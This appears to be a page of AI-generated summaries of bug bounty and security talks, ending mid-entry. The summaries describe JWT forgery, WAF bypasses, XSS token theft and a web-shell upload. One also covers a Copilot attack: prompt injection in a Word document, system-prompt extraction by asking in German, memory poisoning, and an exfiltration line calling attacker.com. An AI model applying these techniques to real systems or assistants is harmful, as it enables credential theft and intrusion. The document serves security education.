Overview: A veteran bug bounty hunter analyzes 12 years and 1,500 HackerOne reports using Claude AI, revealing uncomfortable truths about duplicates, evolving bug classes, and reports that go nowhere.

Key Topics: 1,500 reports across 228 programs from 2014-2025; duplicate rates rising from 19% to 27%; 561 reports with no bounty; and the gap between public profiles and actual outcomes.

Technical Details: The speaker fed all reports to Claude for classification, discovering his signature bug class stopped yielding results years ago while simpler bugs paid more frequently. One in five reports were duplicates throughout his career.

Takeaways: Bug bounty success metrics hide significant failure rates. Even experienced hunters face persistent duplicate challenges, and the bugs you're known for may not be the bugs that pay.

talks.summary:
Attack Overview

Johan demonstrates stealing passwords from Microsoft Copilot using only a Word document—no link clicks, macros, or downloads. Victims trigger the attack by pressing the built-in summarize button.

Persistent Memory Exfiltration

The chain combines prompt injection, a CSP bypass, and storage in Copilot's per-user memory. Once planted via a malicious document or email, the payload persists across future conversations in Word, Excel, Outlook, and SharePoint, activating on trigger words or actions.

Novel Exfiltration Channel

Unlike typical AI attacks using image blocks, Microsoft blocks images here. Data instead exits through a font-based channel—an unexpected vector the researcher had not seen before. Johan notes he even asked Copilot to help find the CSP bypass.

Broader Context

The interview ties to prior DEF CON Singapore research on persistent Copilot data exfiltration and discusses how memory features in AI assistants create durable attack surfaces once compromise occurs.
talks.aiSummary: Overview: Prominent AI security researcher Johann Rehberger ("wunderwuzzi") joins host Ben Sadeghipour (@NahamSec) to demonstrate a persistent data exfiltration attack targeting Microsoft 365 Copilot. Rehberger explains how an adversary can weaponize a standard Word document or email to execute indirect prompt injection, poison Copilot’s long-term memory, and establish persistent data-stealing triggers across future sessions. The researchers present a live demonstration showing how an injected payload uses delayed tool invocation and a universal Content Security Policy (CSP) font-loading bypass to steal user secrets without macros or malicious links. Key Topics: - Microsoft 365 Copilot architecture and persistent memory attack surface - Indirect prompt injection via Word document summarization - Delayed tool invocation for reliable memory persistence - Universal Content Security Policy (CSP) bypass via CSS font rendering Technical Details: The attack targets the "lethal trifecta" in enterprise Large Language Model (LLM) agents: access to private user data, processing of untrusted external content, and the capability to initiate outbound communications. Rehberger audited enterprise Microsoft 365 Copilot—spanning Word, Excel, PowerPoint, SharePoint Online, and the Windows desktop app. During reconnaissance, he extracted Copilot's system prompt by requesting it in German (bypassing English refusal guardrails) and mapped available internal tools by instructing the model to format tool definitions within an XML document. This revealed key system tools, including `record_memory` (which manages persistent user memory) and `create_text_document` (which renders interactive artifact content). To exploit the system, the attacker distributes an ordinary Word document containing indirect prompt injection instructions. When the victim clicks Copilot's native "Summarize" button, the model processes the text. To bypass guardrails that prevent direct memory poisoning, Rehberger developed a "delayed tool invocation" technique: the prompt forces Copilot to append an engaging follow-up prompt (e.g., asking if information about Albert Einstein was helpful). Any affirmative or conversational response from the user satisfies the agent's intent requirement, causing Copilot to execute `record_memory` and inject persistent instructions into the user’s long-term profile. The stored memory payload instructs Copilot that whenever the user discusses sensitive topics—such as passwords, API keys, or proprietary code—in any future session across Word, Excel, or SharePoint, it must silently generate an artifact HTML document containing an external CSS stylesheet. While Microsoft implemented filters and strict CSP rules blocking `` tags and markdown images across various M365 subdomains, remote CSS font loading (`@font-face { src: url('https://attacker.com/leak?data=...') }`) was universally permitted across all Copilot interfaces. The injected prompt commands Copilot to automatically switch the artifact view from code to live preview, silently triggering the external HTTP request to fetch the font and exfiltrating the victim's plaintext password to the attacker's server. Key Takeaways: Enterprise AI deployments must treat long-term memory storage as a high-risk persistence layer requiring explicit user confirmation before recording instructions. Applications must enforce strict egress network boundaries and comprehensive Content Security Policies that restrict all outbound resource loading, including fonts and stylesheets. Security teams must account for indirect prompt injection in document summarization workflows, recognizing that data exfiltration can occur without traditional macros, executable downloads, or user link clicks. talks.aiSummary:
Overview:
Security researcher and content creator Ben Sadeghipour (NahamSec) documents his experiences navigating DEF CON in Las Vegas in an experiential conference vlog. Through behind-the-scenes footage and informal technical discussions, Sadeghipour captures the community dynamics, village presentations, and competitive challenges that define the conference. The vlog highlights activities across the Bug Bounty Village and Red Team Village, offering practical commentary on hardware CTFs, the impact of artificial intelligence on offensive security, and the growing problem of low-quality, unvalidated vulnerability reporting.

Key Topics:
- Community engagement and technical activities across DEF CON villages (Bug Bounty Village, Red Team Village)
- Hardware badge architecture featuring custom printed circuit boards (PCBs) and integrated CTF puzzle challenges
- Examining the operational impact of AI on red teaming workflows and offensive automation
- Industry perspectives on bug bounty report hygiene, automated scanner noise, and threat model validation

Technical Details:
Sadeghipour provides a first-hand view into the operational infrastructure of DEF CON's specialized villages. At the Bug Bounty Village, organizers unveiled a custom hardware badge engineered as an independent challenge platform. The PCB was designed with embedded firmware running localized Capture The Flag (CTF) challenges, requiring attendees to solve cryptographic puzzles, inspect onboard memory, and manipulate logic gates via physical input buttons to extract sequential flag strings (e.g., binary bit toggling) directly linked to the broader village competition.

Beyond community events, Sadeghipour participates in an opening panel at the Red Team Village alongside fellow practitioners (Ads, Ryan, and Bill), debating whether generative artificial intelligence and large language models represent a terminal threat to traditional offensive red teaming. The panel emphasizes that while automated tooling accelerates routine reconnaissance and script generation, human intuition, complex multi-step pivoting, and deep contextual reasoning remain indispensable for enterprise compromise. Shifting to vulnerability disclosure, Sadeghipour interviews bug bounty triage engineers and program managers regarding submission quality. The interviewees voice significant frustration over the surge in low-quality reports generated by automated scanners (such as Burp Suite web vulnerability scanner false positives) and unverified AI prompts. They highlight that submitters frequently claim critical impacts for unexploitable informational findings without understanding underlying application threat models or validating reproducible impact, generating severe operational friction and draining triage resources.

Key Takeaways:
Hands-on hardware badges and village CTF challenges remain vital educational platforms for developing practical reverse engineering and firmware manipulation skills. In offensive security and red teaming, practitioners must view artificial intelligence as an efficiency multiplier rather than a replacement for contextual adversary emulation and creative problem solving. Finally, security researchers participating in bug bounty programs must rigorously validate proof-of-concepts and contextualize business impact prior to submission, avoiding automated report spam that undermines researcher-triage relationships.

(AI summary — Gemini Flash)

A NahamSec walkthrough of a real engagement where a single malicious file upload through an image-to-PDF conversion pipeline led to full customer database access.

## Recon and Target Selection
Hired to reach crown-jewel data—not checkbox scanning—the tester mapped inputs and focused on upload features that pipe files through Ghostscript or similar converters, a recurring weak point.

## AI-Assisted Exploitation
ChatGPT helped enumerate recent Ghostscript CVEs with public POCs from the past three years. The presenter automated uploading crafted PDFs across entry points until one payload yielded a shell.

## Takeaways
File-conversion microservices are high-value targets. Combine manual app mapping with AI-assisted CVE research, but validate exploits hands-on—many payloads fail before one grants initial access.

talks.title: Can I Replace AI With My Recon Methodology?
talks.teaser: Can I Replace AI With My Recon Methodology?.
talks.summary:
# Overview
In this talk, the speaker explores integrating artificial intelligence into their bug bounty recon methodology to streamline lead generation. Emphasizing that their typical vulnerability hunting relies on manual testing and standard web proxy tools rather than automated exploit-finding AI, the speaker sets out to solve a common recon bottleneck: sifting through large sets of asset data and tracking targets. By connecting Claude to Google Sheets via Zapier's Model Context Protocol (MCP) and using Neo to generate an asset-evaluation framework, the workflow automatically evaluates HTTPX output, prioritizes interesting targets, and populates a collaborative Google Sheet.

# Key Topics
- **Recon and Lead Generation**: Offloading repetitive recon tasks—such as grepping through DNS records, page titles, and status codes—to AI to discover promising attack surfaces.
- **MCP Integration with Zapier**: Configuring a Zapier MCP server (`mcp.zapier.com`) connected to Google Sheets and integrating it with Claude to give the model tool-use access for reading, writing, and updating spreadsheets.
- **Framework Design with Neo**: Using Neo to build a comprehensive scoring and tiering framework that assesses HTTPX recon data based on path naming conventions, redirects, and detected technologies.
- **Asset Prioritization Strategy**: Categorizing targets into prioritized tiers (admin panels, DevOps tools, APIs, dev/staging environments, and auth portals) while filtering down lower-value marketing pages.

# Technical Details
1. **Zapier MCP Configuration**: An MCP server labeled `recon mcp` is set up on Zapier, granting access to 28 tools including Google Sheets actions. The resulting URL is connected directly into Claude.
2. **Framework Generation via Neo**: The speaker iteratively prompted Neo to construct a decision framework using HTTPX fields (titles, content length, technologies, redirect locations). The model generated a tiered prioritization system:
   - *Tier 1*: High-value targets such as admin panels, internal infrastructure, CI/CD pipelines, DevOps tooling, issue trackers (Jira), Jenkins, and source code artifacts.
   - *Tier 2*: APIs, development sites, authentication portals, monitoring services, and databases.
   - *Tier 3*: Login portals, file upload endpoints, CDNs, email systems, support ticketing, and payment/billing pages.
   - *Tier 4*: Low-priority marketing sites, blogs, news, and press portals.
   - *Technology & Redirect Analysis*: Evaluating IIS, Tomcat, WordPress, as well as employee SSO redirects (Okta, OneLogin, SAML, Windows ADFS).
3. **Prompt and Project Execution**: The instructions were structured as `prompt.md` and added into a Claude project named `recon mcp` with instructions to score assets and write findings directly into Google Sheets.
4. **Target Execution**: The methodology was tested against a subset of Equifax vulnerability disclosure program (VDP) recon data. The speaker extracted roughly 400 unique 403-status assets (`cat results | sort -u | grep` for 403 and Equifax) and fed them to Claude. Claude analyzed the input and created a Google Sheet listing scored assets (identifying 11 critical, 7 high, and 1 medium asset), highlighting 15 non-production environments, 9 APIs, 10 Java applications, and 2 ServiceNow instances alongside suggested next steps.

# Takeaways
The experiment demonstrates that AI paired with tool-calling capabilities like MCP can effectively act as a lead-generation assistant for bug bounty hunters. While AI can occasionally misunderstand rules across repeated runs, feeding structured HTTPX output into a rigorously prompted model reliably parses, scores, and exports high-priority targets into structured formats like Google Sheets, significantly reducing manual data-parsing overhead.

# Overview
In this video, an ethical hacker steps away from purely technical content to share an everyday carry (EDC) tour of their backpack essentials. Emphasizing that none of the gear is sponsored or affiliated, the speaker walks through each compartment of their gifted Red Bull/Yeti backpack to showcase the items, tools, and personal routines they rely on for day-to-day hacking, productivity, and lifestyle management.

# Key Topics
- **Everyday Tech & Computing:** The primary and secondary devices used for general work and ethical hacking/bug bounties.
- **Productivity & Mental Health:** Analog tools, personal journals, and goal-tracking systems utilized to stay organized and mitigate burnout.
- **Hacker Hardware & Accessories:** Specialized physical penetration testing tools, micro-devices, and covert storage carried on a daily basis.
- **Health, Fitness & Everyday Care:** Personal items including gym supplements, lighting gear, and hygiene essentials that complete the daily pack.

# Technical Details
- **Laptops and Mobile Devices:**
  - Primary machine: An Apple MacBook (believed to be an M2 model) equipped with 48 GB of RAM and adorned with community and conference stickers from DEF CON, Hacking Hub, and CDL.
  - Secondary phone: An Android flip phone dedicated exclusively to bug bounty testing accounts, used to keep spam calls and promotional marketing texts separate from personal communications.
- **Physical & Ethical Hacking Tools:**
  - Access Control Device: A handheld key-cloning device used to emulate and store RFID/NFC keys for opening office doors.
  - Pwnagotchi: A micro-device (gifted by a friend named Blake) used colloquially to capture Wi-Fi handshakes and hashes.
  - Malicious / Covert USB: A Hak5 USB drive disguised alongside a standard regular USB drive for physical engagements and content demonstration.
- **Accessories & Productivity Gear:**
  - Eyewear: Ray-Ban Meta smart glasses carried in the front pocket for quick access and potential live-streaming at DEF CON.
  - Productivity System: A personal journal for morning thoughts and stress management, alongside the "Your Best Self" 13-week planner used to set 3 main goals, weekly objectives, target tasks, and gratitude notes.
  - Audio & Peripherals: Multiple generations of wireless headphones, an external mouse for design and gaming, an external hard drive for video transfers, and portable lighting.

# Takeaways
While the speaker's backpack carries key offensive security gear such as a Hak5 USB, access cloner, and Pwnagotchi, the majority of an ethical hacker's daily loadout consists of practical productivity, wellness, and organizational items. Emphasizing structured daily planning, goal tracking, and clear separation between personal lines and bug bounty communications, the presenter illustrates that maintaining personal organization and routine is just as essential to a cybersecurity professional as specialized hardware.

talks.title: This Tiny JWT Mistake = Massive Bug Bounty
talks.teaser: This Tiny JWT Mistake = Massive Bug Bounty.
talks.summary:
### Overview
This presentation explores real-world techniques used by attackers to tamper with, forge, and exploit JSON Web Tokens (JWTs) to bypass modern web application authentication. Beyond fundamental vulnerabilities in token implementations, the speaker demonstrates how environment misconfigurations—specifically sharing signing secrets between development and production environments—can lead to severe vulnerabilities such as invite-only bypasses and account takeover.

### Key Topics
- **JWT Architecture and Algorithms**: Structure of JWTs (Base64-encoded header, payload, and signature) and the core distinctions between symmetric signing (HS256 using a shared HMAC secret) and asymmetric signing (RS256 using private/public key pairs).
- **Algorithm Tampering & Weak Secrets**: Exploitation via the `none` algorithm and brute-forcing weak HS256 secret keys using dictionaries like `rockyou.txt` or default secrets sourced from public repositories.
- **Algorithm Confusion Attacks**: Forging tokens by converting an RS256 token to HS256 and signing it using an exposed public verification key as the HMAC secret.
- **Cross-Environment Token Reuse**: Exploiting differences between dev and production access controls when both systems rely on identical signing secrets.
- **Signed Session Cookies and Framework Tokens**: Expanding beyond JWTs to target signed cookies and tokens in frameworks like Django, Flask, and Express.

### Technical Details
- **Algorithm "none" Attack**: Attackers strip the signature, alter the header algorithm to `none`, and craft custom payloads that poorly configured or legacy backends accept without verifying.
- **Secret Key Cracking**: Attackers brute-force HS256 tokens signed with predictable secrets (such as `secret1`, `jwt123`, or `password`) using wordlists like `rockyou.txt` or GitHub scrapers, allowing them to modify user IDs or roles and resign valid tokens.
- **Algorithm Confusion Mechanics**: In misconfigured apps expecting RS256, attackers change the header to HS256. If the server does not enforce the algorithm, it may evaluate the token using its RS256 public key as the HMAC secret key. Attackers obtain this public key—often by fuzzing with `ffuf` or checking within the `/.well-known/` directory—and sign an arbitrary token using that public key.
- **The Dev-to-Prod Case Study**: The speaker discovered an open development instance (`app-dev.site.com`) of an invite-only production web application. After signing up without an invite code on the dev site, the speaker obtained a valid JWT. Because both development and production environments shared the exact same signing key, the speaker submitted the dev token to the production site. The token was accepted, successfully bypassing the invite requirement and logging into an existing account in production.
- **Expanding Scope**: Attackers are encouraged to fingerprint backends and test signed session cookies or framework tokens in Django, Flask, and Express using tools like `Cookie Monster` by Ian Carroll to brute-force predictable keys.

### Takeaways
- **Enforce and Validate Algorithms**: Servers must strictly validate and lock down expected signing algorithms rather than trusting values supplied in token headers.
- **Isolate Environment Secrets**: Development and staging environments must never share signing keys, secrets, or configurations with production.
- **Hacking with an Objective**: Security researchers should focus on maximizing impact—using reconnaissance on development assets to pivot, escalate privileges, access hidden functionality, and impact production targets.

talks.title: Live Recon: Hacking With STOK
talks.teaser: Coverage of Live Recon: Hacking With STOK from the conference program.
talks.summary:
Live Recon: Hacking With STOK is a practical reconnaissance stream featuring NahamSec and security researcher STOK (Fredrick Stoksund) analyzing large-scale bug bounty program data from HackerOne and Bugcrowd using the Trickest platform. The primary focus is lead generation and methodology for identifying promising targets and vulnerabilities within bug bounty programs.

## Overview
NahamSec partners with Trickest to scan nearly every major bug bounty program, resulting in massive datasets covering organizations like Yahoo, Quora, Binance, Stanford, Snapchat, and others. The stream demonstrates practical techniques for filtering and analyzing this data to identify interesting attack vectors. The data is available free at checkers.io.

## Key Methodologies
STOK emphasizes a deep-dive, manual approach rather than automation at scale. His primary strategy involves: (1) selecting targets with depth rather than pursuing numerous subdomains; (2) creating multiple user accounts to test for IDORs and authentication issues; (3) monitoring targets for changes over time; (4) looking for what breaks systems rather than what works. He describes this as "falling in love with a target" and comparing it to re-watching a TV series—you notice small changes others miss.

## Technical Analysis Approach
The core recon methodology involves filtering HTTP responses by status codes to identify anomalies. Rather than treating 404s, 403s, and 500s as dead ends, STOK advocates sorting by content length to find rare responses. Standard error pages typically have consistent sizes; outliers indicate something unusual occurred—often application logic or JavaScript files revealing additional functionality. Error pages returning 403 with substantial data frequently contain useful information like embedded scripts pointing to other endpoints.

## Practical Techniques Demonstrated
- **Content Length Filtering**: Sorting by response size to isolate anomalies; treating rare sizes as high-value targets
- **403 Analysis**: Examining forbidden pages for embedded JavaScript or error messages that reveal application structure
- **Redirect Chain Mapping**: Following 302/307 redirects to identify internal portals, staging environments, or different infrastructure
- **Swagger/API Documentation Hunting**: Looking for swagger.io, openapi, or api/docs endpoints that provide API specifications
- **JavaScript File Inspection**: Using browser DevTools or view source to extract API endpoints, roles, and functionality
- **Wayback Machine Integration**: Cross-referencing Internet Archive data to find historical endpoints and functionality
- **Match/Replace Techniques**: Modifying API responses (e.g., changing `false` to `true`, switching user roles) to access restricted features
- **Fuzzing Organization IDs**: Iterating through org parameters to discover other organizations or accounts
- **Basic Auth Testing**: Attempting default credentials or password spraying against 401-protected endpoints

## Real-World Examples
The stream walks through several targets including Daimler, Marriott, MongoDB internal portals, and others. Notable findings include redirect chains revealing internal infrastructure, org ID parameters susceptible to fuzzing, login pages permitting registration or password resets, and APIs behind authentication proxies (Okta, etc.) that may expose functionality through JavaScript inspection.

## Key Insights
- Most successful hacking combines hunches, experience, and data analysis
- Automation handles volume but manual investigation yields quality findings
- Different skill sets and approaches lead to different discoveries—there's no single "correct" way
- Deep knowledge of a single target often outperforms shallow scanning of many targets
- Error responses and edge cases often reveal more than successful requests
- Swagger documentation is particularly valuable for API security testing
- Internal asset discovery (corp, intra, dev subdomains) frequently surfaces testing/staging environments with fewer security controls

## Tools and Platforms
Trickest (primary data analysis tool), Burp Suite (Intruder, match/replace), Splunk (large dataset analysis), browser DevTools, Wayback Machine, grep for pattern matching.

## Future Work
STOK mentions preparing a presentation at Black Hat with Jonah (FFUF creator) on a novel tool related to bit-flip squatting. He plans to participate in Def Con and the H1702 competition after taking time to recover from previous burnout. He emphasizes the importance of avoiding burnout by hacking for curiosity and fun rather than purely financial motivation.

talks.summary:
### Overview
In this talk, Shubham Shah explores practical, modern Web Application Firewall (WAF) bypass strategies on large enterprise attack surfaces. Rather than focusing on complex, meticulously crafted payload mutations or traditional methods like origin IP discovery, Shah advocates for keeping bypass techniques simple and scalable. The presentation focuses on exploiting inherent WAF architectural limitations, utilizing cloud serverless compute for distributed testing, and abusing reverse proxy trust relationships.

### Key Topics
- **WAF Inspection Limits:** Exploiting default maximum request body size thresholds in major WAF vendors.
- **Automated Body Padding:** Using a specialized Burp Suite extension to push malicious payloads past inspection limits.
- **Distributed Fuzzing via Serverless Compute:** Distributing reconnaissance, vulnerability scanning, and fuzzing traffic across thousands of dynamic IP addresses using AWS API Gateway and serverless fleets.
- **WAF-via-WAF Bypasses:** Circumventing origin protections by funneling requests to known origin IPs through an attacker-controlled WAF account.
- **HTTP/2 Cleartext (h2c) Smuggling:** Bypassing internal WAF layers and reverse proxies using h2c smuggling.

### Technical Details
- **Request Body Size Limits:** For performance reasons, most WAFs only inspect a bounded prefix of request bodies (e.g., POST, PUT, PATCH requests). For example, AWS WAF defaults to inspecting 8 KB on ALBs/AppSync (up to 64 KB on CloudFront/API Gateway), Azure defaults to 128 KB, Akamai inspects the first 8 KB by default (configurable up to 128 KB), and Cloudflare inspects 128 KB (with up to 500 MB on enterprise plans). Anything sent past these limits is ignored by the inspection engine. Shah created a Burp Suite plugin, **no WAF please**, which context-awarely pads bodies with dummy data (XML comments, JSON dummy keys/values, or URL-encoded junk) so the actual payload executes cleanly beyond the inspection threshold.
- **IP Rotation and API Gateways:** Shah discusses using the **IP Rotate** Burp plugin and **fireprox** to route HTTP traffic via AWS API Gateway instances across multiple regions, leveraging AWS's dynamic outbound IP pool to circumvent IP-based WAF rate limits.
- **Mass Serverless Execution with Shadow Clone:** To overcome the high cost and bandwidth limits of proxy pools when testing large attack surfaces, Shah leverages **Shadow Clone**. This tool distributes commands across serverless functions (like AWS Lambda, where free tiers offer up to 1 million monthly invocations). Demonstrated workflows include:
  1. Resolving live hosts across massive target lists using `httpx` split into 40 assets per worker.
  2. Checking live assets for specific vulnerabilities (such as a path traversal payload matching a specific response string) without triggering Akamai IP bans.
  3. Running singular Nuclei templates (e.g., Swagger discovery) across an attack surface with low split thresholds and guardrails.
  4. Rapid directory and file brute forcing with `ffuf` where each request originates from a unique IP in serverless infrastructure.
- **Alternative Bypass Vectors:**
  - *Bypassing WAF via WAF:* When backends rely on shared authenticated TLS certificates or whitelist WAF IP ranges (e.g., historical Cloudflare setups), an attacker who identifies the origin IP can point their own Cloudflare account's DNS to that origin IP, lower security controls to minimum, and route payloads through the trusted WAF network.
  - *h2c Smuggling:* Useful against AWS ALBs or custom reverse proxy/WAF architectures to smuggle requests past WAF inspection rules and rate limits.

### Takeaways
Security testers do not need to spend excessive hours crafting obscure payload encodings when testing body-based endpoints; understanding size inspection thresholds provides a reliable bypass. Furthermore, serverless platforms provide high IP variability for fuzzing and scanning without prohibitive proxy costs. On defense, organizations must understand their WAF's body inspection caps, deploy strict per-zone origin authentication certificates, and recognize that WAFs are friction points rather than absolute boundaries.

talks.teaser: Coverage of Your Mental Health Matters from the conference program.
talks.summary:
### Overview
In this personal talk, security researcher and bug bounty hunter Ben Sadeghipour (known online as NahamSec) opens up about his mental health struggles, burnout, and personal journey toward healing. Driven by an intense desire to build his community, Ben overworked himself by streaming security content up to four days a week on top of a full-time job. This excessive workload, combined with the isolation of the COVID-19 pandemic and the breakdown of his marriage resulting in a divorce around his 30th birthday, led to severe anxiety, depression, and unhealthy coping mechanisms such as alcohol reliance.

### Key Topics
- **Overworking and Burnout:** How excessive streaming schedules and tunnel vision strained personal relationships and deteriorated mental well-being.
- **Seeking Help and Therapy:** Overcoming the stigma of therapy and recognizing the need for external professional support rather than managing emotional crises alone.
- **Environmental Reset:** The importance of curating one's physical space (rearranging furniture and living areas) and social circle to foster personal healing.
- **November Challenge & Habit Building:** Using personal discipline challenges to quit alcohol and adopt wellness habits, such as daily exercise, reading, and meditation.
- **Actionable Coping Mechanisms:** Practical tools including journaling, daily to-do lists, guided meditation, physical workouts, and dietary improvements to process difficult emotions.

### Technical Details
While the talk focuses on lifestyle and mental health rather than software vulnerabilities or exploits, Ben outlines a structured daily regimen and personal framework designed to counter depression and anxiety:
- **Interval Running & Meditation:** Ben began physical conditioning with interval running (alternating 30 seconds of jogging with 90 seconds of walking). A discussion with fellow creator STÖK revealed that counting intervals functioned as mindfulness, prompting Ben to adopt structured 5–10 minute guided meditation sessions using audio apps to regulate breathing and anxiety.
- **Structured Three-Part Morning Journaling:** To process thoughts without resorting to alcohol or overthinking, Ben implemented a morning writing habit focusing on: (1) noting what he is grateful for, (2) articulating specific intrusive thoughts or sources of sadness (such as processing his divorce), and (3) creating a prioritized to-do list.
- **Micro-Accomplishments & Daily Routine:** Starting each morning by making his bed, preparing breakfast, and completing meditation established early momentum and self-efficacy.
- **Dietary Adjustments:** Cutting out fast food (defined as drive-through meals) and processed foods to eliminate physical sluggishness and support mood stability.

### Takeaways
Ben stresses that struggling with trauma and mental health is normal and that difficult experiences can build personal character if approached constructively. Rather than escaping through alcohol or denial, individuals should confront uncomfortable feelings and establish consistent daily routines. He urges viewers to seek outside help when needed, go outside for physical activity, practice mindfulness, and establish manageable daily habits. Additionally, Ben announced a charitable campaign pledging $1 per comment on the video, along with sponsorship funds from NahamCon (scheduled for May 24th), toward mental health and suicide prevention charities.

talks.teaser: Coverage of Turning a $500 bounty into $30,000+ from the conference program.
talks.summary:
### Overview
In this talk, the speaker explains how security researchers and bug bounty hunters can escalate standard Cross-Site Scripting (XSS) findings beyond simple `alert(1)` proof-of-concepts to demonstrate maximum critical impact. While an `alert(1)` confirms arbitrary JavaScript execution in a victim's browser, relying on it often results in standard or medium-severity payouts. The presentation outlines three key techniques to turn routine XSS findings into critical account takeovers and higher bug bounties, highlighted by the speaker's real-world experience turning an XSS into a $30,000 bounty during a HackerOne live hacking event.

### Key Topics
- **Limitations of Traditional XSS Impact:** The default assumption that an attacker can easily dump session cookies via `document.cookie` often fails in modern web applications due to expiration policies, cookie restrictions, and rapid rotation.
- **Technique 1: Session & Cookie Extraction:** The conventional method of dumping cookies and sending them to an attacker-controlled listener, while common in legacy applications, often lacks maximum impact today.
- **Technique 2: Modifying Account Data or Adding Organization Users:** Exploiting application workflows without direct cookie access by changing user details (e.g., swapping email addresses and immediately triggering password reset flows) or adding attacker-controlled administrative users to SaaS organizations.
- **Technique 3: API Token and Key Exfiltration via Background Requests:** Monitoring network calls (such as `/api/me` or `/me`) to identify endpoints that return sensitive JSON data, JSON Web Tokens (JWT), or API keys, and scripting background requests to exfiltrate these credentials.
- **Real-World Escalation Case Study:** An account of how an initial reflected XSS was chained with a Content Security Policy (CSP) bypass and a legacy API endpoint leaking API keys during a live hacking event, turning a basic finding into a $30,000 critical reward.

### Technical Details
To demonstrate credential exfiltration, the speaker walks through a lab environment featuring a modern web application architecture:
- **Inspecting Background Calls:** Opening the browser's Network tab reveals that loading the profile sends an asynchronous request to `/api/v1/api/me` (or `/me`), which returns a JSON object containing the user's name, email status, a JWT token, and an API key.
- **Crafting the Payload:** Instead of calling `alert(1)`, a custom JavaScript snippet is constructed using an `XMLHttpRequest` (or alternatively `fetch`) to issue a GET request to the internal `/me` endpoint. An event listener parses the JSON response, extracts the target `JWT` value, and transmits it via an outbound HTTP request to an external server controlled by the attacker (such as an interact.sh server, Burp Collaborator, or Apache server).
- **Payload Delivery:** The JavaScript code is Base64-encoded and wrapped inside an `eval(atob(...))` payload. Injected into the vulnerable input via Burp Suite, the script executes in the victim's session, queries the authenticated API endpoint, and forwards the sensitive JWT token to the attacker's listener.

### Takeaways
- **Never Stop at `alert(1)`:** Submitting a basic alert often results in an implied medium impact; investing extra time to demonstrate tangible harm like account takeover drastically increases bounty severity and payout.
- **Inspect Sensitive Workflows:** Test whether sensitive operations—such as updating an email address—require current password confirmation. If not, chain the email update directly with a forgot-password request.
- **Examine API Responses:** Thoroughly audit the network traffic of modern single-page and API-driven applications to identify legacy or standard endpoints that expose JWTs or authorization keys capable of granting complete API access.

talks.summary:
### Overview
In this walkthrough, the speaker demonstrates how they uncovered critical vulnerabilities in a major European online casino's lottery system. Because non-disclosure agreements and private bug bounty programs often prevent recording live targets, the speaker collaborated with Adam Langley to recreate the scenario as a Capture The Flag (CTF) challenge hosted on hackinghub.io. The demonstration illustrates that encountering an application with only a login prompt and no visible registration does not mean security testing has reached a dead end.

### Key Topics
- Overcoming restricted target interfaces with no apparent sign-up option.
- Endpoint discovery and API fuzzing with tools like ffuf and curl.
- Exploiting verbose API error messages that reveal required request parameters.
- Bypassing account verification workflows using exposed user tokens.
- Privilege escalation via leaked user enumerations and password brute-forcing to reach an unrestricted file upload.

### Technical Details
The attack began on a lottery application presenting only a login interface and a password reset link. Reviewing client-side JavaScript revealed initial authentication routes under the path `/api/v1/auth`.

1. **Endpoint Discovery & Parameter Identification:** Using `ffuf` with custom wordlists (referencing lists such as SecLists or Assetnote), the speaker discovered an unadvertised endpoint at `/api/v1/auth/new`. A `GET` request returned a `405 Method Not Allowed`, indicating that different HTTP methods were expected. Sending a `POST` request revealed verbose error responses specifying missing parameter fields, such as `username`, `email`, `password`, and `password2`. Supplying these fields successfully created an account.

2. **Manual Account Verification:** Logging into the newly registered account showed a status of "awaiting verification." Without receiving a verification email, the speaker inspected background traffic and identified a call to `/api/v1/users/me`. This response exposed the user ID and a `verification_token`. Authenticated fuzzing using the session cookie uncovered an endpoint at `/api/v1/verify`. Submitting a `POST` request with the required `verification_token` and `user_id` verified the account.

3. **Privilege Escalation and Admin Takeover:** Once verified, the application granted access to an internal interface leaking a list of all registered lottery usernames and identifying administrative accounts. By capturing the login request in Burp Suite and brute-forcing passwords (e.g., using lists like `rockyou.txt`), the speaker compromised an administrative account. Administrative access unlocked an unrestricted file upload feature, which allowed an attacker to upload a web shell and achieve remote execution on the target system.

### Takeaways
Security researchers should not abandon an assessment simply because there is no obvious public registration link. Hidden API endpoints, verbose error messages, and unauthenticated registration functions often leave paths to obtain an initial low-privileged session. Once authenticated, mapping secondary API routes and identifying information disclosure flaws can quickly escalate access to administrative compromise and full system control.

talks.summary:
Ryan Montgomery, known as '0day,' is the #1-ranked player on TryHackMe (with nearly 2 million users) and co-founder of pentester.com, a rapidly growing cybersecurity platform. Before pivoting to cybersecurity, he operated three mental health and substance abuse treatment facilities for over seven years, managing 144 beds and approximately 120 employees. A defining achievement was his scholarship program, which provided free treatment to over 100 individuals without private insurance—addressing a personal gap he experienced while struggling with childhood addiction and lacking access to private facilities.

Ryan defines OSINT (Open Source Intelligence) as intelligence gleaned from publicly available sources: records, credentials, images, social media, and archived websites. He has integrated OSINT methodologies into pentester.com, which features Darkwatch (a database of 140 billion sensitive records including credentials, social security numbers, and home addresses) and Identity IQ (facial recognition using 120 facial measurements to locate where individuals appear online).

Ryan gained viral attention through recent activism targeting child exploitation. After discovering a forum-based website hosting such content, he reported it to authorities and media outlets—all refused to publish due to legal concerns. Through investigation, he identified the site owner as Nathan Larson, a Virginia politician who ran for Congress twice, and found that Frederick (founder of The Pirate Bay) was knowingly hosting it. Six months later, Larson was arrested in Denver with a kidnapped 12-year-old.

Unable to accept institutional inaction, Ryan partnered with Dustin Lampro, an undefeated professional MMA fighter (also appearing on The Ultimate Fighter), to work with adult decoys posing as children online. When suspected predators arrive for meet-ups, Ryan and Dustin confront them using preloaded OSINT (names, jobs, family, criminal histories) before police arrive and make arrests. Ryan employs reverse image searching, employee databases, and deep OSINT to identify individuals from minimal information.

A viral podcast clip describing the exploitation content spread over 100 million times across platforms, leading to major podcast appearances including Project Veritas and the Shawn Ryan Show. Khloé Kardashian reshared his content to 307 million followers. Ryan plans to partner with nonprofits working alongside law enforcement for increased prosecutions and potential trafficking ring investigations. He is not monetizing these efforts.

Ryan addressed criticism from detractors who excavated his MySpace history from ages 13–14, when he struggled with substance abuse and used typical emo-era usernames. Now nearly 30, he emphasized that personal growth means learning from teenage mistakes, and his current actions demonstrate his commitment to helping others.

talks.summary:
### Overview
In this talk presented at NahamCon 2022 EU, André (known online as @0xacb or master of mystery), co-founder of Ethiack and ethical hacking professor at the University of Porto, introduces techniques and tools for black-box fuzzing of regular expressions. Modern web applications heavily rely on regular expressions for input validation, sanitization, and normalization, but implementations across languages frequently suffer from subtle edge cases and inconsistencies. André demonstrates how systematic byte-level fuzzing around key regex positions can bypass strict security controls and lead to severe security vulnerabilities like account takeover and web cache deception.

### Key Topics
